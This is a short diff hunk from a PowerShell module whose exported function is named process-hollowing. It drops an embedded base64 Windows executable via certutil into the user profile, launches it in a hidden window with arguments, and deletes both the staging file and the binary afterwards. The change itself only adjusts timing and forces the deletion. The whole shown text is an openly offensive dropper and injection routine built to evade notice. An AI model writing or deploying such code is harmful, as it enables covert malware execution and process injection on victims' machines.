@@ -326,8 +326,8 @@ echo 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 '> cod.txt
 sleep(0.7)
 certutil -decode "$env:userprofile\cod.txt" "$env:userprofile\holw.exe"
-sleep(0.4)
-del "$env:userprofile\cod.txt"
+sleep(1.1)
+del "$env:userprofile\cod.txt" -force
 $process = Start-Process "holw.exe" -ArgumentList "$PcodeContent" , "$TmodeContent" -WindowStyle Hidden -PassThru; $process.WaitForExit(); Remove-Item "holw.exe" -Force -ErrorAction SilentlyContinue
 }
 Export-ModuleMember -Function process-hollowing
